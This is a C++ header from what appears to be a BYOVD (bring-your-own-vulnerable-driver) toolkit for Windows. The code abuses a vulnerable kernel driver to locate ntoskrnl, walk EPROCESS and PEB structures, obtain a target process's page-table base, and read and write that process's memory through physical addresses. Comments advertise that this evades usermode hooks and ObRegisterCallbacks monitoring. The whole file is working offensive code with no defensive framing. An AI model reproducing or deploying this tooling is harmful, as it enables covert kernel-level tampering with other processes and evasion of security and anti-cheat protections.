#pragma once
// ============================================================
// kernel_ctx.h — Kernel context for BYOVD-based operations
// Uses a vulnerable driver to read/write kernel memory,
// resolve kernel exports, and walk kernel structures.
// ============================================================

#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <cstdint>
#include <cstdio>
#include <string>
#include <vector>
#include "driver_provider.h"

#pragma comment(lib, "ntdll.lib")

namespace BYOVD
{
    // ntoskrnl export resolver
    class KernelContext
    {
        IDriverProvider& m_drv;
        uintptr_t       m_ntoskrnl     = 0;
        uintptr_t       m_ntoskrnlSize = 0;

    public:
        explicit KernelContext(IDriverProvider& drv) : m_drv(drv) {}

        bool Init()
        {
            // Find ntoskrnl.exe base via EnumDeviceDrivers
            LPVOID drivers[1024];
            DWORD needed = 0;
            if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
            {
                printf("[Kernel] EnumDeviceDrivers failed\n");
                return false;
            }

            // First entry is always ntoskrnl
            m_ntoskrnl = reinterpret_cast<uintptr_t>(drivers[0]);
            printf("[Kernel] ntoskrnl base: 0x%llX\n", (uint64_t)m_ntoskrnl);

            // Load ntoskrnl as data to resolve exports
            HMODULE hLocal = LoadLibraryExW(L"ntoskrnl.exe", nullptr,
                DONT_RESOLVE_DLL_REFERENCES);
            if (!hLocal)
            {
                printf("[Kernel] Failed to load ntoskrnl locally\n");
                return false;
            }

            auto localBase = reinterpret_cast<uintptr_t>(hLocal);
            auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(localBase);
            auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(localBase + dos->e_lfanew);
            m_ntoskrnlSize = nt->OptionalHeader.SizeOfImage;

            FreeLibrary(hLocal);
            return true;
        }

        // Resolve an ntoskrnl export to its kernel VA
        uintptr_t GetKernelExport(const char* name)
        {
            HMODULE hLocal = LoadLibraryExW(L"ntoskrnl.exe", nullptr,
                DONT_RESOLVE_DLL_REFERENCES);
            if (!hLocal) return 0;

            auto offset = reinterpret_cast<uintptr_t>(
                GetProcAddress(hLocal, name));
            if (!offset)
            {
                FreeLibrary(hLocal);
                return 0;
            }
            offset -= reinterpret_cast<uintptr_t>(hLocal);
            FreeLibrary(hLocal);

            return m_ntoskrnl + offset;
        }

        // Find EPROCESS for a given PID by walking the ActiveProcessLinks
        uintptr_t FindEPROCESS(DWORD pid)
        {
            // Get PsInitialSystemProcess (the System EPROCESS)
            auto pSysProc = GetKernelExport("PsInitialSystemProcess");
            if (!pSysProc)
            {
                printf("[Kernel] Failed to resolve PsInitialSystemProcess\n");
                return 0;
            }
            printf("[Kernel] PsInitialSystemProcess export VA: 0x%llX\n", (uint64_t)pSysProc);

            auto systemEproc = m_drv.ReadMemory<uintptr_t>(pSysProc);
            if (!systemEproc)
            {
                printf("[Kernel] Failed to read PsInitialSystemProcess\n");
                return 0;
            }
            printf("[Kernel] System EPROCESS: 0x%llX\n", (uint64_t)systemEproc);

            // Probe: read first 8 bytes of System EPROCESS to verify access
            uint64_t probe = 0;
            if (!m_drv.ReadBuffer(systemEproc, &probe, 8))
            {
                printf("[Kernel] Cannot read System EPROCESS — VA translation broken\n");
                return 0;
            }
            printf("[Kernel] System EPROCESS probe OK (first 8B: 0x%016llX)\n", probe);

            // Auto-detect PID offset: scan EPROCESS for value 4 (System PID)
            // Scan from 0x000 to 0x1000 in 8-byte steps (covers all known builds + Canary)
            size_t detectedPidOff = 0, detectedLinksOff = 0;
            {
                constexpr size_t SCAN_SIZE = 0x1000;
                auto* buf = new(std::nothrow) uint8_t[SCAN_SIZE];
                if (buf && m_drv.ReadBuffer(systemEproc, buf, SCAN_SIZE))
                {
                    // First: dump key regions for diagnostics
                    printf("[Kernel] EPROCESS hex dump (key offsets):\n");
                    for (size_t dumpOff : { (size_t)0x028, (size_t)0x430, (size_t)0x440, (size_t)0x448,
                                            (size_t)0x4B0, (size_t)0x4C0, (size_t)0x4C8, (size_t)0x4D0,
                                            (size_t)0x550, (size_t)0x5A0, (size_t)0x5A8, (size_t)0x610,
                                            (size_t)0x614, (size_t)0x618 })
                    {
                        if (dumpOff + 8 <= SCAN_SIZE)
                        {
                            uint64_t v = *reinterpret_cast<uint64_t*>(buf + dumpOff);
                            printf("[Kernel]   +0x%03zX = 0x%016llX", dumpOff, (unsigned long long)v);
                            if (v == 4) printf("  <-- PID=4!");
                            if ((v >> 48) == 0xFFFF) printf("  (kernel ptr)");
                            printf("\n");
                        }
                    }

                    // Scan for PID=4 with linked list validation
                    for (size_t off = 0x28; off < SCAN_SIZE - 16; off += 8)
                    {
                        uint64_t val = *reinterpret_cast<uint64_t*>(buf + off);
                        if (val == 4) // System PID
                        {
                            // Validate: next 8 bytes should be a kernel pointer (Links.Flink)
                            uint64_t flink = *reinterpret_cast<uint64_t*>(buf + off + 8);
                            bool isKernPtr = (flink >> 48) == 0xFFFF || (flink >> 48) == 0xFFFE;
                            printf("[Kernel] PID=4 found at +0x%03zX, flink=0x%016llX %s\n",
                                off, (unsigned long long)flink, isKernPtr ? "(valid kernel ptr)" : "(NOT a kernel ptr)");
                            if (isKernPtr && !detectedPidOff)
                            {
                                detectedPidOff = off;
                                detectedLinksOff = off + 8;
                                printf("[Kernel] *** Using PID offset 0x%03zX, Links offset 0x%03zX ***\n",
                                    detectedPidOff, detectedLinksOff);
                            }
                        }
                    }
                }
                delete[] buf;
                if (!detectedPidOff)
                    printf("[Kernel] Auto-detect failed — no PID=4 with valid Flink found in 0xC00 bytes\n");
            }

            size_t OFF_PID   = detectedPidOff   ? detectedPidOff   : 0x4C0;
            size_t OFF_LINKS = detectedLinksOff  ? detectedLinksOff : 0x4C8;
            printf("[Kernel] Using offsets: PID=0x%zX Links=0x%zX\n", OFF_PID, OFF_LINKS);

            uintptr_t current = systemEproc;
            uintptr_t listHead = current + OFF_LINKS;

            int visited = 0;
            // Walk the doubly linked list
            for (int i = 0; i < 4096; ++i)
            {
                auto currentPid = m_drv.ReadMemory<uintptr_t>(current + OFF_PID);
                visited++;

                if (i < 5 || static_cast<DWORD>(currentPid) == pid)
                    printf("[Kernel]   [%d] EPROCESS=0x%llX PID=%llu\n",
                        i, (uint64_t)current, (unsigned long long)currentPid);

                if (static_cast<DWORD>(currentPid) == pid)
                {
                    printf("[Kernel] Found target EPROCESS at 0x%llX (visited %d)\n",
                        (uint64_t)current, visited);
                    return current;
                }

                // Next = Flink - offset
                auto flink = m_drv.ReadMemory<uintptr_t>(current + OFF_LINKS);
                if (!flink || flink == listHead)
                {
                    printf("[Kernel] Walk ended at iteration %d (flink=0x%llX, listHead=0x%llX)\n",
                        i, (uint64_t)flink, (uint64_t)listHead);
                    break;
                }

                current = flink - OFF_LINKS;
            }

            printf("[Kernel] EPROCESS for PID %lu not found (visited %d processes)\n", pid, visited);
            return 0;
        }

        // Find the base address of a module loaded in a target process
        // by walking the process's PEB->Ldr linked list via kernel memory
        uintptr_t FindProcessModule(DWORD pid, const wchar_t* moduleName)
        {
            auto eproc = FindEPROCESS(pid);
            if (!eproc) return 0;

            // _EPROCESS.Peb offset for Win11 24H2+
            constexpr size_t OFF_PEB = 0x550;
            auto peb = m_drv.ReadMemory<uintptr_t>(eproc + OFF_PEB);
            if (!peb) return 0;

            // PEB.Ldr (offset 0x18 in x64 PEB)
            auto ldr = m_drv.ReadMemory<uintptr_t>(peb + 0x18);
            if (!ldr) return 0;

            // LDR_DATA.InLoadOrderModuleList
            auto listHead = ldr + 0x10; // InLoadOrderModuleList offset
            auto flink = m_drv.ReadMemory<uintptr_t>(listHead);

            for (int i = 0; i < 512 && flink && flink != listHead; ++i)
            {
                // LDR_DATA_TABLE_ENTRY: +0x30 = DllBase, +0x58 = BaseDllName
                auto dllBase = m_drv.ReadMemory<uintptr_t>(flink + 0x30);

                // Read BaseDllName UNICODE_STRING
                auto nameLen = m_drv.ReadMemory<USHORT>(flink + 0x58);        // Length
                auto nameBuf = m_drv.ReadMemory<uintptr_t>(flink + 0x58 + 8); // Buffer ptr

                if (nameLen > 0 && nameLen < 520 && nameBuf)
                {
                    wchar_t name[260]{};
                    m_drv.ReadBuffer(nameBuf, name, min((size_t)nameLen, sizeof(name) - 2));

                    if (_wcsicmp(name, moduleName) == 0)
                        return dllBase;
                }

                flink = m_drv.ReadMemory<uintptr_t>(flink); // Flink
            }

            return 0;
        }

        // Get the DirectoryTableBase (CR3) for a process
        uintptr_t GetProcessCR3(uintptr_t eprocess)
        {
            // _KPROCESS.DirectoryTableBase offset (beginning of EPROCESS = KPROCESS)
            constexpr size_t OFF_DTB = 0x28;
            return m_drv.ReadMemory<uintptr_t>(eprocess + OFF_DTB);
        }

        IDriverProvider& Driver() { return m_drv; }
        uintptr_t NtoskrnlBase() const { return m_ntoskrnl; }

        // ----------------------------------------------------------
        // Cross-process memory R/W via physical memory (kernel driver)
        // Translates VA in target process using its CR3, then reads/
        // writes through physical addresses. Completely bypasses
        // NtReadVirtualMemory / NtWriteVirtualMemory — invisible to
        // usermode hooks and ObRegisterCallbacks VM monitoring.
        // ----------------------------------------------------------

        // Get CR3 for a PID (convenience wrapper)
        uint64_t GetProcessCR3(DWORD pid)
        {
            auto eproc = FindEPROCESS(pid);
            if (!eproc) return 0;
            return GetProcessCR3(eproc);
        }

        // Read from target process virtual memory via driver
        bool ReadProcessVirtual(DWORD pid, uintptr_t va, void* buffer, size_t size)
        {
            uint64_t cr3 = GetProcessCR3(pid);
            if (!cr3)
            {
                printf("[Kernel] Failed to get CR3 for PID %lu\n", pid);
                return false;
            }
            return m_drv.ReadBufferProcess(cr3, va, buffer, size);
        }

        // Write to target process virtual memory via driver
        bool WriteProcessVirtual(DWORD pid, uintptr_t va, const void* buffer, size_t size)
        {
            uint64_t cr3 = GetProcessCR3(pid);
            if (!cr3)
            {
                printf("[Kernel] Failed to get CR3 for PID %lu\n", pid);
                return false;
            }
            return m_drv.WriteBufferProcess(cr3, va, buffer, size);
        }

        // Cached variant — caller provides CR3 to avoid repeated EPROCESS walks
        bool ReadProcessVirtualEx(uint64_t cr3, uintptr_t va, void* buffer, size_t size)
        {
            return m_drv.ReadBufferProcess(cr3, va, buffer, size);
        }

        bool WriteProcessVirtualEx(uint64_t cr3, uintptr_t va, const void* buffer, size_t size)
        {
            return m_drv.WriteBufferProcess(cr3, va, buffer, size);
        }
    };
}
